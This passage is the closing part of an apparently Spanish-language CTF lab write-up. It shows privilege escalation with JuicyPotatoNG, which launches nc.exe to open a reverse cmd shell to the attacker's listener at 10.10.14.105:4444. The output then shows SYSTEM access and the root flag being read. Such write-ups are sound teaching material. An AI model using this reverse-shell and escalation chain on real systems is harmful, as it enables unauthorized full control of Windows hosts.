+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="no">Temp</span><span class="o">&gt;</span> <span class="p">.</span><span class="nf">/</span><span class="no">JuicyPotatoNG</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">t</span> <span class="o">*</span> <span class="o">-</span><span class="nb">p</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe"</span> <span class="o">-</span><span class="n">a</span> <span class="s1">'10.10.14.105 4444 -e cmd'</span>
+</code></pre></div></div>
+<p>Nos fijamos en el netcat y vemos que recibimos la conexión como nt authority\system</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">sudo</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4444</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">contrase</span><span class="err">ñ</span><span class="n">a</span> <span class="n">para</span> <span class="ss">voidnet: 
+</span><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">4444</span> <span class="o">...</span>
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span><span class="p">]</span> <span class="mi">52357</span>
+<span class="no">Microsoft</span> <span class="no">Windows</span> <span class="p">[</span><span class="no">Version</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">17763.2989</span><span class="p">]</span>
+<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="no">Microsoft</span> <span class="no">Corporation</span><span class="o">.</span> <span class="no">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+
+<span class="no">C</span><span class="p">:\</span><span class="o">&gt;</span><span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="nb">system</span>
+</code></pre></div></div>
+<p>Ya que somos root nos vamos al directorio C:\Users\Administrator\Desktop para visualizar la flag de root</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Desktop</span><span class="o">&gt;</span><span class="n">type</span> <span class="n">root</span><span class="p">.</span><span class="nf">txt</span>
+<span class="n">type</span> <span class="n">root</span><span class="p">.</span><span class="nf">txt</span>
+<span class="mi">43</span><span class="o">*******************************</span><span class="mi">6</span>
+
+<span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Desktop</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p>Eso es todo, espero que se haya entendido</p>
+
+<p>Gracias por leer :D.</p>
